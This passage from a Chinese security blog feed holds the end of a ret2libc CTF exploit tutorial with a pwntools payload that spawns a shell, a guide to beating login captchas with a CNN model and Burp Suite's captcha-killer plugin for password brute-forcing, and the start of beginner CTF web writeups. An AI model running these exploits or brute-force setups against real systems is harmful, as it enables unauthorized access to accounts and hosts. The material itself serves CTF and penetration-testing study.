class="line">binsh_addr = libcbase + next(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment">#第二次栈溢出，执行system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">payload_2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(system_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(binsh_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>, payload_2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>执行后成功 getshell<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/3/OC%5B_OJ%5D_%7DX%5DFJ%5BL%5D%7B0PB%6094.png" alt=""></p>
<p>上面说的都是32位程序，而在64位程序中函数的调用栈是不同的，这也是我们写 payload 时需要注意的地方</p>
<blockquote>
<ul>
<li>32位程序
<ul>
<li><strong>函数参数</strong> 在 <strong>函数返回地址</strong> 的上方</li>
</ul>
</li>
<li>64位程序
<ul>
<li>采用寄存器传参，所以我们需要覆盖寄存器</li>
<li>前六个参数按顺序存储在寄存器 rdi, rsi, rdx, rcx, r8, r9 中，参数超过六个时，从第七个开始压入栈中</li>
<li>内存地址不能大于 0x00007FFFFFFFFFFF， <strong>6 个字节长度</strong> ，否则会抛出异常。</li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="结语"><a class="header-anchor" href="#结语">¶</a>结语</h2>
<p>继续努力学习，后面遇见新的知识点会继续补充这篇文章</p>
<blockquote>
<p>参考链接：<br>
<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/</a><br>
<a href="https://www.yuque.com/hxfqg9/bin/ug9gx5">https://www.yuque.com/hxfqg9/bin/ug9gx5</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>卷积神经网络结合burpsuite实现渗透测试中的验证码爆破</title>
    <url>/posts/37998/</url>
    <content><![CDATA[<h1>前言</h1>
<p>首先，在这里要感谢c0ny1师傅开发的captcha-killer插件和Nick li大佬的开源项目，还有miniboom师傅提供的思路<br>
在平时我们进行渗透测试的时候，常常会遇到下面这种情况<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/D%7B5Y%29EA%7DE%25W0XE%5B1OL7MRVP.png" alt=""><br>
在网站的验证码无法绕过的情况下，我们又需要进行网站的爆破，但爆破得填写正确的验证码进行一个认证，这种情况下可能会劝退部分小伙伴们，这个时候如何处理这种问题成为了一个值得探讨的点。<br>
看过其他师傅的思路，在这里有一个有效的办法，就是采用深度学习的卷积神经网络对验证码进行训练识别，然后建立模型，调用burpsuite的插件captcha-killer获取识别接口进行爆破。</p>
<h1>安装</h1>
<h2 id="cnn-captcha的安装和使用"><a class="header-anchor" href="#cnn-captcha的安装和使用">¶</a>cnn_captcha的安装和使用</h2>
<h3 id="项目安装及环境准备"><a class="header-anchor" href="#项目安装及环境准备">¶</a>项目安装及环境准备</h3>
<p>项目为了方便已经转到我的github的仓库上，大家可以去我的仓库进行下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">项目地址：https:&#x2F;&#x2F;github.com&#x2F;dota-st&#x2F;cnn_captcha</span><br></pre></td></tr></table></figure>
<p>项目介绍：<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%24QG3%40MNR4O%7DTVAZ%28Y748AU8.png" alt=""></p>
<p>项目使用python语言编写，所以需要搭建python环境，推荐下载python36版本。git clone 项目下来之后，对requirements.txt文件中的第三方库版本进行一个修改。tensorflow的版本改为1.15.3。如果你也想和我一样使用显卡来跑程序，就改成tensorflow-gpu==1.15.3。<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/0%40PNXSO4JL21W%7D~XU508D53.png" alt=""></p>
<blockquote>
<p>注意：pip最好进行换源，不然下载这些库的速度可能让你怀疑人生~这里推荐换源成豆瓣源</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip换源方法：</span><br><span class="line"></span><br><span class="line">找到python的安装路径下的site-packages\pip\_internal\models\index.py文件</span><br><span class="line">PyPI &#x3D; Index(&#39;https:&#x2F;&#x2F;pypi.python.org&#x2F;&#39;)</span><br><span class="line">修改成https:&#x2F;&#x2F;pypi.python.org&#x2F; 为 https:&#x2F;&#x2F;pypi.douban.com&#x2F;simple</span><br></pre></td></tr></table></figure>
<p>换源之后，敲pip install -r requirements.txt命令进行下载文本里的第三方库</p>
<h3 id="项目使用"><a class="header-anchor" href="#项目使用">¶</a>项目使用</h3>
<p>确认安装好python的第三方库之后，就可以开始模型的训练了~<br>
一开始，在没有图片验证码的数据集的情况下，我们可以借助gen_sample_by_captcha.py文件生成验证码的数据集</p>
<p>首先，我们需要去配置文件进行一个修改（当然不修改也可以）打开conf/captcha_config.json文件，修改成像我这样<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/_4_CH%7BQQ4867P%25%7D80DQ2%28TE.png" alt=""><br>
一开始我们就先训练纯数字的验证码模型，设置的过于复杂，模型的训练时间也会越长，想要有良好的识别率，就不得不进行多次训练。<br>
运行gen_sample_by_captcha.py文件，生成10000张图片文件<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/R2%29%24R8A08%40%608%40%5B%25ZQL3N%25%25K.png" alt=""><br>
在sample/origin目录下可以看见生成的图片<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/H%40PA%40K7FZO3%5D%40%25R%60Q1BIX3D.png" alt=""><br>
然后sample/origin目录下新建两个文件夹，train和test（不用创建也行，代码里会自动判断有无，进行创建）<br>
接下来需要使用verify_and_split_data.py文件，我们先看一下他的配置文件/conf/sample_config.json</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;origin_image_dir&quot;: &quot;sample&#x2F;origin&#x2F;&quot;,  # 原始文件</span><br><span class="line">  &quot;new_image_dir&quot;: &quot;sample&#x2F;new_train&#x2F;&quot;,  # 新的训练样本</span><br><span class="line">  &quot;train_image_dir&quot;: &quot;sample&#x2F;train&#x2F;&quot;,    # 训练集</span><br><span class="line">  &quot;test_image_dir&quot;: &quot;sample&#x2F;test&#x2F;&quot;,      # 测试集</span><br><span class="line">  &quot;api_image_dir&quot;: &quot;sample&#x2F;api&#x2F;&quot;,        # api接收的图片储存路径</span><br><span class="line">  &quot;online_image_dir&quot;: &quot;sample&#x2F;online&#x2F;&quot;,  # 从验证码url获取的图片的储存路径</span><br><span class="line">  &quot;local_image_dir&quot;: &quot;sample&#x2F;local&#x2F;&quot;,    # 本地保存图片的路径</span><br><span class="line">  &quot;model_save_dir&quot;: &quot;model&#x2F;&quot;,            # 从验证码url获取的图片的储存路径</span><br><span class="line">  &quot;image_width&quot;: 100,                    # 图片宽度</span><br><span class="line">  &quot;image_height&quot;: 60,                    # 图片高度</span><br><span class="line">  &quot;max_captcha&quot;: 4,                      # 验证码字符个数</span><br><span class="line">  &quot;image_suffix&quot;: &quot;png&quot;,                 # 图片文件后缀</span><br><span class="line">  &quot;char_set&quot;: &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;,  # 验证码识别结果类别</span><br><span class="line">  &quot;use_labels_json_file&quot;: false,                       # 是否开启读取&#96;labels.json&#96;内容</span><br><span class="line">  &quot;remote_url&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:6100&#x2F;captcha&#x2F;&quot;,      # 验证码远程获取地址</span><br><span class="line">  &quot;cycle_stop&quot;: 3000,                                  # 启动任务后的训练指定次数后停止</span><br><span class="line">  &quot;acc_stop&quot;: 0.99,                                    # 训练到指定准确率后停止</span><br><span class="line">  &quot;cycle_save&quot;: 500,                                   # 训练指定次数后定时保存模型</span><br><span class="line">  &quot;enable_gpu&quot;: 0,                                     # 是否开启GUP训练</span><br><span class="line">  &quot;train_batch_size&quot;: 128,                             # 训练时每次使用的图片张数，如果CPU或者GPU内存太小可以减少这个参数</span><br><span class="line">  &quot;test_batch_size&quot;: 100                               # 每批次测试时验证的图片张数，不要超过验证码集的总数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们进行一个简单修改，打码部分是我自定义的地址，暂时可以保持原路径不变<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/HXWUB_WGG2%7DFJPI37AZCS%5BA.png" alt=""><br>
然后运行verify_and_split_data.py文件，程序会同时校验和分割origin和new_train两个目录中的图片,按照比例分到test和train文件夹中；<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/~R77DWZRZXH4GH%252W%5BATK9O.png" alt=""><br>
后续有了更多的样本，可以把样本放在new_train目录中再次执行verify_and_split_data。<br>
程序会把无效的文件留在原文件夹。<br>
此外，当你有新的样本需要一起训练，可以放在sample/new目录下，再次运行verify_and_split_data.py即可。<br>
需要注意的是，如果新的样本中有新增的标签，你需要把新的标签增加到char_set配置中或者labels.json文件中</p>
<p>训练集和测试集都有了之后，接下来就是训练模型，运行train_model.py文件进行模型训练<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%409HLQA8%28J%7D%7B_1E1%7DVJEI%60%7BR.png" alt=""><br>
训练模型的速度取决取决于你的电脑，可能几十分钟，可能几个小时或者几十个小时不等，可以重复多次运行文件进行训练提高准确率<br>
这里贴张下面讲实战中使用的模型的训练图片，使用了2000张验证码图片，我的电脑跑了一分钟左右的时间吧<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%28LUUW%28M9X%7DFU9G%7DGJL5TQPR.png" alt=""><br>
接下来我们运行test_batch.py文件进行一个验证<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%5D4KSDH%60KUWFJO%7DKUY61P~ZY.png" alt=""><br>
接着启动接口的api，运行webserver_recognize_api.py，此时占一个会话窗口<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/WHR9A%25W0%5BL878MEGG~%7DB%40%605.png" alt=""><br>
再次运行，默认是6000端口，这里我改成了7000端口<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/GE~ZGQURWU%282PL%7D%7BE7H1%28W0.png" alt=""><br>
启动recognize_local.py文件发送请求进行一个验证<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/Z7%7B_4%29F8%60F%5D4%60DUT%7DP4TV_I.png" alt=""><br>
接口返回数据就ok啦~</p>
<h2 id="captcha-killer的安装"><a class="header-anchor" href="#captcha-killer的安装">¶</a>captcha-killer的安装</h2>
<p>项目地址:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;captcha-killer&#x2F;releases</span><br></pre></td></tr></table></figure>
<p>下载好jar包之后，打开burpsuite进行安装<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/BGR%24~525EAJZ%7D%257%60QJ%7BBFLP.png" alt=""></p>
<h1>实战</h1>
<p>首先使用python爬虫对网站的验证码进行一个爬取<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/1IOO51MC64~YFHOLE%7D_%5B%24LN.png" alt=""><br>
然后按照上面的步骤进行一个模型训练<br>
这是我本人服务器上搭建的网站<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/D%7B5Y%29EA%7DE%25W0XE%5B1OL7MRVP.png" alt=""><br>
首先，我们需要抓取生成验证码文件的包，然后右键发送到captcha面板上<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20201117154445.png" alt=""><br>
然后在killer面板上，点击一下获取，就可以出现验证码图片和信息了<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/2~EOM%5B%25%5BN%7BFNI%40L%28ZM~2DZU.png" alt=""><br>
然后我们需要在webserver_recognize_api.py文件新增加一个方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/base64&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up_imageBase64</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> request.form[<span class="string">&#x27;image_file&#x27;</span>]:</span><br><span class="line"></span><br><span class="line">        timec = str(time.time()).replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        file = request.form[<span class="string">&#x27;image_file&#x27;</span>]</span><br><span class="line">        img = base64.b64decode(file)</span><br><span class="line">        img = BytesIO(img)</span><br><span class="line">        img = Image.open(img, mode=<span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="comment"># username = request.form.get(&quot;name&quot;)</span></span><br><span class="line">        print(<span class="string">&quot;接收图片尺寸: &#123;&#125;&quot;</span>.format(img.size))</span><br><span class="line">        img_size = img.resize((image_width, image_height), Image.ANTIALIAS)</span><br><span class="line">        print(<span class="string">&quot;接收图片尺寸2：&#123;&#125;&quot;</span>.format(img_size))</span><br><span class="line">        s = time.time()</span><br><span class="line">        value = R.rec_image(img_size)</span><br><span class="line">        e = time.time()</span><br><span class="line">        print(<span class="string">&quot;识别结果: &#123;&#125;&quot;</span>.format(value))</span><br><span class="line">        <span class="comment"># 保存图片</span></span><br><span class="line">        print(<span class="string">&quot;保存图片： &#123;&#125;&#123;&#125;_&#123;&#125;.&#123;&#125;&quot;</span>.format(api_image_dir, value, timec, image_suffix))</span><br><span class="line">        file_name = <span class="string">&quot;&#123;&#125;_&#123;&#125;.&#123;&#125;&quot;</span>.format(value, timec, image_suffix)</span><br><span class="line">        file_path = os.path.join(api_image_dir + file_name)</span><br><span class="line">        img.save(file_path)</span><br><span class="line">        result = &#123;</span><br><span class="line">            <span class="string">&#x27;time&#x27;</span>: timec,   <span class="comment"># 时间戳</span></span><br><span class="line">            <span class="string">&#x27;value&#x27;</span>: value,  <span class="comment"># 预测的结果</span></span><br><span class="line">            <span class="string">&#x27;speed_time(ms)&#x27;</span>: int((e - s) * <span class="number">1000</span>)  <span class="comment"># 识别耗费的时间</span></span><br><span class="line">        &#125;</span><br><span class="line">        img.close()</span><br><span class="line">        <span class="keyword">return</span> jsonify(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        content = json.dumps(&#123;<span class="string">&quot;error_code&quot;</span>: <span class="string">&quot;1001&quot;</span>&#125;)</span><br><span class="line">        resp = response_headers(content)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure>
<p>因为原本的方法up_image()是发送本地图片文件的形式，而我们在captcha_killer需要通过发送表单请求来进行接收<br>
接着再发送一个requests请求，进行抓包后发送到interface面板上<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20201117154703.png" alt=""><br>
然后我们把图片内容的位置用标签来代替。<br>
比如该例子使用的接口是post提交image参数，参数的值为图片二进制数据的base64编码后的url编码。那么Requst template(请求模版)面板应该填写如下：<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/WI%40%604SZ%29%5D4CUK%256MCFK042G.png" alt=""><br>
接口模板设置：</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>标签</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td><code>&lt;@IMG_RAW&gt;&lt;/@IMG_RAW&gt;</code></td>
<td>代表验证码图片原二进制内容</td>
</tr>
<tr>
<td>2</td>
<td><code>&lt;@URLENCODE&gt;&lt;/@URLENCODE&gt;</code></td>
<td>对标签内的内容进行url编码</td>
</tr>
<tr>
<td>3</td>
<td><code>&lt;@BASE64&gt;&lt;/@BASE64&gt;</code></td>
<td>对标签内的内容进行base64编码</td>
</tr>
</tbody>
</table>
<p>然后点击识别，即可获取到接口返回的数据包<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/E%7BZN79%25Z56%7B5W5%7D%7B%28CQAG~I.png" alt=""><br>
这里的匹配方式规则：</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>规则类型</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Repose  data</td>
<td>这种规则用于匹配接口返回包内容直接是识别结果</td>
</tr>
<tr>
<td>2</td>
<td>Regular  expression</td>
<td>正则表达式,适合比较复杂的匹配。比如接口返回包{“coede”:1,“result”:“abcd”}说明abcd是识别结果，我们可以编写规则为result&quot;:“(.*?)”}</td>
</tr>
<tr>
<td>3</td>
<td>Define  the start and end positions</td>
<td>定义开始和结束位置,使用上面的例子，可以编写规则{“start”:21,“end”:25}</td>
</tr>
<tr>
<td>4</td>
<td>Defines  the start and end strings</td>
<td>定义开始和结束字符，使用上面的例子，可以编写规则为{“start”:“result”:“,“end”:”“}”}</td>
</tr>
</tbody>
</table>
<p>确认识别无误之后，点击锁定，避免一会进行爆破时出错</p>
<p>接下来我们去抓取登录界面发送的包，然后发送到intruder面板，然后设置参数<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/AHZMTVCB%60RAA%28X4X3MKI%28GI.png" alt=""><br>
验证码的pyload选择我们的插件进行生成<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/VI%256A%7BKPX3DTJSZU5T%25Y0P3.png" alt=""><br>
成功拿到密码<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%5BS2N%29%5BR%7BF%7D4OJHTGJ0QDB%7B3.png" alt=""></p>
<p><strong>注：本博客仅供技术研究，若将其信息做其他用途，由用户承担全部法律及连带责任，本博客不承担任何法律及连带责任，请遵守中华人民共和国安全法</strong></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界Web区~持续更新中！</title>
    <url>/posts/14571/</url>
    <content><![CDATA[<h1>新手练习区</h1>
<h2 id="view-source"><a class="header-anchor" href="#view-source">¶</a>view source</h2>
<hr>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/NE96%7DBO%60EX%28%5B%40YGU%25FPT%29I3.png" alt=""></p>
<p>题目提示查看源代码，但无法使用右键打开开发者模式，我们这个时候可以使用f12快捷键打开开发者模式</p>
<br>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%242%29AW49Y%5BP5%407W%7BM8%7D%25S%40%25R.png" alt=""></p>
<br>
<p>flag就藏在源代码里，我们操练起cv大法，然后提交拿分~~~</p>
<h2 id="robots"><a class="header-anchor" href="#robots">¶</a>robots</h2>
<hr>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/_6%5D5%7B%7DXV%29FML%60R14%7DQMV9N4.png" alt=""></p>
<br>
<blockquote>
<p>Robots协议是Web站点和搜索引擎爬虫交互的一种方式，Robots.txt是存放在站点根目录下的一个纯文本文件。该文件可以指	定搜索引擎爬虫只抓取指定的内容，或者是禁止搜索引擎爬虫抓取网站的部分或全部内容。当一个搜索引擎爬虫访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索引擎爬虫就会按照该文件中的内容来确定访问的范围；如果该文件不存在，那么搜索引擎爬虫就沿着链接抓取。另外，robots.txt必须放置在一个站点的根目录下，而且文件名必须全部小写。</p>
</blockquote>
<br>
<p>所以我们在url输入robots.txt</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/H%5BM%5D%25%29J%5BP89Q9BM2U8~11VI.png" alt=""></p>
<p>跳转到页面，提示我们还有个f1ag_1s_h3re.php,我们继续访问文件</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%7BQ%25D9C7260DI5L%5BSMIY8X2G.png" alt=""></p>
<br>
<p>即可拿到flag呦~</p>
<h2 id="backup"><a class="header-anchor" href="#backup">¶</a>backup</h2>
<hr>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/4VR%40591%60F0%7D%5BYOQ%40X5%5D%7BYEF.png" alt=""></p>
<br>
<p>这道题提示我们是文件备份，文件泄露的问题</p>
<p>常见的备份文件名为：index.php~和index.php.bak</p>
<p>试着输入了一下，没想到成功下载了文件，打开文件，即可得到flag嗷~</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>备份文件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css&quot;</span> <span 